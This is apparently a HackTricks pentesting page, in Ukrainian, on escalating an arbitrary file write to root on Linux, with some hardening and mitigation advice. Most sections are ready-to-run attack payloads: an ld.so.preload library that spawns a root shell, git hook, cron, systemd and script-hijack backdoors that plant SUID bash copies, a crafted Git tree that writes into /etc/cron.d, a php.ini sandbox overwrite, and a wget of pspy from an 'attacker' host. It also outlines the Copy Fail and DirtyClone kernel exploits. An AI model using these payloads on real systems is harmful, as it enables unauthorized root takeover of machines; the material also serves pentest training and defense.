# Произвольний запис до Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` — це загальносистемний список shared objects, які dynamic linker завантажує перед іншими shared objects. Режим secure-execution застосовує додаткові обмеження до preloading, тому шлях до бібліотеки, наприклад `/tmp/pe.so`, не є універсальною технікою для SUID-binary.\
Якщо ви можете створити або змінити цей файл, процес, який його завантажує, завантажить зазначену бібліотеку перед іншими shared objects, що дає змогу виконати код у контексті цього процесу.<sup>[[12]](#references)</sup>

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** — це виконувані скрипти, які запускаються під час подій у репозиторії, зокрема операцій commit і merge. Якщо **привілейований скрипт або користувач** виконує ці дії, а зловмисник може **записувати дані до папки `.git`**, hook можна використати для **підвищення привілеїв**.<sup>[[13]](#references)</sup>

Наприклад, можна **створити скрипт** у git-репозиторії в **`.git/hooks`**, щоб він завжди виконувався під час створення нового commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Обхід шляхів під час експорту дерева Git із привілеями

Привілейований синхронізатор може уникати checkout і натомість перелічувати репозиторій, на який впливає атакер, за допомогою `git ls-tree`, читати кожен blob через `git cat-file`, об'єднувати повідомлений шлях із staging-директорією та самостійно записувати його. Це перетворюється на **довільний запис файлів із привілеями синхронізатора**, коли він поєднує `-c safe.directory=*` (вимикаючи перевірку Git для репозиторіїв, що належать іншому користувачу) з відсутністю перевірки належності до destination. Абсолютне ім'я елемента дерева змушує Python's `os.path.join(stage, name)` відкинути `stage`; відносне ім'я, що містить `../`, виходить за його межі під час розв'язання файловою системою. Оскільки застосунок матеріалізує raw tree, а не просить Git виконати checkout, відхилення шляхів під час checkout ніколи не захищає sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Шукайте таку структуру коду в root-сервісах, timers, deployment agents, template importers і backup/restore jobs:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Запис tree кодується як `<mode> SP <name> NUL <raw object ID>`. Опція `git hash-object --literally` навмисно дозволяє дані об’єктів, які звичайний парсинг або `git fsck` можуть відхилити, тому disposable clone може створити tree, ім’я файлу якого є абсолютним призначенням. У цьому прикладі створюється blob із cron-файлом, створений tree обгортається в commit, а branch переміщується на нього; для експлуатації все одно потрібні дозволи на оновлення repository, який використовує привілейоване завдання, і Git server, що приймає malformed object.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening має охоплювати як отримання даних із repository, так і фінальну операцію з файловою системою:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Замініть `safe.directory=*` на точні repository, яким сервіс має довіряти, і за можливості виконуйте обробку repository без привілеїв root.
- Відхиляйте абсолютні імена та будь-які компоненти `.` або `..` до materialization. Після об'єднання canonicalize шлях і перевірте, що destination залишається в межах призначеного root.
- Уникайте symlink race під час перевірки й відкриття: відкривайте відносно trusted directory descriptor, а в Linux використовуйте `openat2()` з `RESOLVE_BENEATH` і `RESOLVE_NO_SYMLINKS` для шляхів, контрольованих attacker.
- Віддавайте перевагу звичайному checkout в ізольованому directory замість повторної реалізації checkout на основі plumbing output. Якщо потрібне raw-object ingestion, увімкніть перевірку на стороні отримувача, наприклад `receive.fsckObjects=true`; не знижуйте рівень `receive.fsck.*`, пов'язаних із pathname, оскільки вони потрібні для відхилення crafted trees.

### Cron і Time files

Якщо ви можете **записувати файли, пов'язані з cron, які виконує root**, зазвичай можна отримати виконання коду під час наступного запуску job. Цікаві цілі включають:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Власний crontab root у `/var/spool/cron/` або `/var/spool/cron/crontabs/`
- Таймери `systemd` і services, які вони запускають

Швидкі перевірки:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Типові шляхи зловживання:

- **Додати нове root cron job** до `/etc/crontab` або файлу в `/etc/cron.d/`
- **Замінити скрипт**, який уже виконується через `run-parts`
- **Встановити backdoor у наявну ціль timer**, змінивши скрипт або binary, який вона запускає

Мінімальний приклад cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Якщо ви можете записувати лише до каталогу cron, який використовується `run-parts`, натомість помістіть туди виконуваний файл:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Нотатки:

- `run-parts` зазвичай ігнорує імена файлів, що містять крапки, тому надавайте перевагу іменам на кшталт `backup`, а не `backup.sh`.<sup>[[15]](#references)</sup>
- Деякі системи використовують таймери `systemd` замість класичного cron, але ідея abuse та сама: **змінити те, що root виконає пізніше**.<sup>[[20]](#references)</sup>

### Файли Service та Socket

Якщо ви можете записувати **файли unit `systemd`** або файли, на які вони посилаються, ви можете отримати code execution від імені root, перезавантаживши та перезапустивши unit, або дочекавшись спрацювання шляху активації service/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Цікаві цілі:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides у `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries, на які посилаються `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Доступні для запису шляхи `EnvironmentFile=`, які завантажуються root service

Швидкі перевірки:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Поширені шляхи зловживання:

- **Перезаписати `ExecStart=`** у модулі service, що належить root, якщо ви можете його змінювати
- **Додати drop-in override** зі шкідливим `ExecStart=` і спочатку очистити старий
- **Вбудувати backdoor у script/binary**, на який уже посилається модуль
- **Перехопити socket-activated service**, змінивши відповідний файл `.service`, який запускається, коли socket отримує з’єднання

Приклад шкідливого override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Типовий процес активації:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Якщо ви не можете самостійно перезапустити служби, але можете редагувати socket-activated unit, можливо, вам потрібно лише **дочекатися підключення клієнта**, щоб запустити backdoored service від імені root.<sup>[[17]](#references)</sup>

### Перезапис обмежувального `php.ini`, який використовує привілейований PHP sandbox

Деякі спеціальні daemons перевіряють наданий користувачем PHP-код, запускаючи `php` із **обмеженим `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо код у sandbox все ще має **будь-який примітив запису** (наприклад, `file_put_contents`) і ви можете отримати доступ до **точного шляху до `php.ini`**, який використовує daemon, ви можете **перезаписати цю конфігурацію**, щоб зняти обмеження, а потім надіслати другий payload, який виконується з підвищеними привілеями.<sup>[[2]](#references)</sup>

Типовий процес:

1. Перший payload перезаписує конфігурацію sandbox.
2. Другий payload виконує код, оскільки небезпечні функції тепер знову ввімкнені.

Мінімальний приклад (замініть шлях на той, який використовує daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Якщо daemon працює як root (або перевіряє шляхи, власником яких є root), друге виконання надає root-контекст. По суті, це **підвищення привілеїв через перезапис конфігурації**, коли sandboxed runtime все ще може записувати файли.

### binfmt_misc

`binfmt_misc` надає реєстрації через `/proc/sys/fs/binfmt_misc`; кожна реєстрація пов’язує шаблон типу файлу з interpreter. Вплив на привілеї залежить від того, хто може змінювати реєстрацію, і який процес згодом виконує відповідний файл, тому перевірте ці вимоги, перш ніж розглядати це як шлях до підвищення привілеїв.<sup>[[21]](#references)</sup>

### Перезапис обробників схем (наприклад, http: або https:)

Desktop environments використовують MIME-асоціації та desktop entries для вибору application для URI-схем; attacker, який може записувати відповідну per-user configuration і каталоги desktop entries, може перенаправити ці схеми до launcher під своїм контролем. Змінивши файл `$HOME/.config/mimeapps.list`, щоб обробники HTTP- і HTTPS-URL вказували на malicious file (наприклад, `x-scheme-handler/http=evil.desktop` і `x-scheme-handler/https=evil.desktop`), клік користувача може запустити цей desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Скрипти/бінарні файли, доступні для запису користувачу, які виконує root

Якщо привілейований процес виконує щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл у каталозі, що належить непривілейованому користувачу), ви можете перехопити його:<sup>[[1]](#references)</sup>

- **Виявлення виконання:** відстежуйте процеси за допомогою pspy, щоб перехопити виклик root шляхів, контрольованих користувачем.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Підтвердьте можливість запису:** переконайтеся, що цільовий файл і його директорія належать вашому користувачу та доступні йому для запису.
- **Перехопіть ціль:** створіть резервну копію оригінального binary/script і розмістіть payload, який створює SUID shell (або виконує будь-яку іншу root-дію), а потім відновіть permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Запустіть привілейовану дію** (наприклад, натисніть кнопку UI, яка запускає helper). Коли root повторно виконає hijacked path, отримайте escalated shell за допомогою `./rootshell -p`.

### Модифікація привілейованих бінарних файлів лише в page cache

Деякі kernel bugs не змінюють файл **на диску**. Натомість вони дозволяють змінювати лише **копію в page cache** читабельного файлу. Якщо ціллю є **setuid** або інший бінарний файл, який виконується root, наступне виконання може запустити контрольовані атакером байти з пам'яті й підвищити привілеї, навіть якщо hash файлу на диску не змінився.<sup>[[3]](#references)[[4]](#references)</sup>

Це корисно розглядати як **runtime-only primitive для запису у файл**:<sup>[[3]](#references)</sup>

- **Диск залишається чистим**: inode і байти на диску не змінюються
- **Пам'ять є зміненою**: процеси, які читають або виконують cached page, отримують вміст, змінений атакером
- **Ефект є тимчасовим**: зміна зникає після перезавантаження або eviction cache

Цей primitive займає проміжне місце між класичним **arbitrary file write** і старішими bugs для зловживання page cache, такими як Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW покладався на race
- Dirty Pipe мав обмеження щодо позиції запису
- Primitive лише для page cache може бути надійнішим, якщо вразливий path надає прямий запис у cached file-backed pages

#### Загальний privesc flow

1. Отримайте kernel primitive, який може записувати у **file-backed page cache pages**
2. Використайте його проти **readable privileged binary** або іншого файлу, який виконується root
3. Запустіть виконання **до** того, як page буде видалена з cache
4. Отримайте code execution від root, поки файл на диску все ще виглядає незміненим

Типові high-value targets:

- **setuid-root** binaries
- Helpers, які запускаються **root services**
- Бінарні файли, які часто виконуються з **containers, що спільно використовують host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) є хорошим прикладом цього класу. Вразливий path знаходився в Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` може переміщувати references на page-cache pages із readable file до crypto TX scatterlist
- in-place `algif_aead` decrypt path повторно використовував source і destination buffers
- `authencesn` після цього записував у destination tag region
- коли ця region усе ще посилалася на spliced file-backed pages, запис потрапляв у **page cache target file**

Отже, цікавою є не сама CVE, а pattern:

- **передати file-backed cache pages у kernel subsystem**
- змусити subsystem **розглядати їх як writable output**
- виконати невеликий контрольований overwrite у пам'яті

Публічний PoC використовував повторювані **4-byte writes**, щоб patch `/usr/bin/su` у пам'яті, а потім виконував його.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) демонструє інший варіант того самого **page-cache-only write-to-root** pattern, але цього разу sink — це **IPsec ESP decrypt**, а не `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Важливою технікою є **metadata-laundering step**:

- `splice()` поміщає **read-only file-backed page-cache page** у ESP-in-UDP packet
- оригінальний DirtyFrag mitigation позначав цей skb як `SKBFL_SHARED_FRAG`, щоб `esp_input()` виконував **copy перед decrypt**
- netfilter `TEE` дублює packet через `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone зберігає **те саме physical page-cache reference**, але втрачає `SKBFL_SHARED_FRAG`
- `esp_input()` після цього вважає clone безпечним і виконує **in-place `cbc(aes)` decrypt** над file-backed page

Отже, lesson для reviewer ширший за саму CVE: якщо mitigation залежить від **skb/page metadata**, щоб визначити, чи потрібно спочатку виконати copy, будь-який **clone/copy path, який зберігає backing page, але видаляє metadata**, може непомітно повторно відкрити write primitive.

Типовий exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, щоб отримати **`CAP_NET_ADMIN` у private network namespace**
2. увімкнути loopback і встановити **netfilter `TEE` rule** у `mangle/OUTPUT`
3. встановити **XFRM ESP transport SAs** через `NETLINK_XFRM`
4. закодувати кожне target 4-byte word у полі SA `seq_hi` (word-selection trick DirtyFrag)
5. надіслати spliced ESP-in-UDP packet, щоб **TEE clone** досяг `esp_input()` і виконав decrypt **in place**
6. повторювати, доки page-cache copy `/usr/bin/su` або іншого privileged executable не міститиме code, контрольований атакером

З операційного погляду impact такий самий, як у прикладі з `AF_ALG`: файл на диску залишається чистим, але `execve()` використовує **mutated page-cache bytes** і надає root.<sup>[[8]](#references)[[9]](#references)</sup>

Корисні exposure checks для цього варіанту:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Короткострокове зменшення attack surface тут також залежить від конкретного шляху: оновлення до kernel із `48f6a5356a33` виправляє шлях клонування, тоді як блокування autoload `xt_TEE` усуває **етап відмивання прапорців**, а блокування `esp4` / `esp6` усуває **приймач розшифрування**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Виявлення та пошук

Якщо ви підозрюєте цей клас помилок, не покладайтеся лише на перевірки цілісності диска. Також перевірте:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Наведені нижче значення конфігурації відрізняють інтерфейс, який можна завантажувати, від інтерфейсу, вбудованого в kernel; правила crypto build зіставляють `CONFIG_CRYPTO_USER_API_AEAD` з `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` можна завантажувати та вивантажувати як module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: інтерфейс вбудований у kernel
- setuid binaries є хорошими цілями, оскільки patch, що працює лише з page cache, може бути достатнім, щоб перетворити локальний foothold на root

#### Зменшення attack surface для шляху `algif_aead`

Якщо вразливий інтерфейс надається loadable module:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Якщо його скомпільовано в kernel, у деяких disclosure повідомлялося про блокування шляху init:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Цей тип mitigation варто пам’ятати й для інших kernel LPE: якщо exploitation залежить від певного optional interface, disabling або blacklisting цього interface може зламати exploit path ще до того, як стане доступним повне оновлення kernel.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
{{#include ../../banners/hacktricks-training.md}}
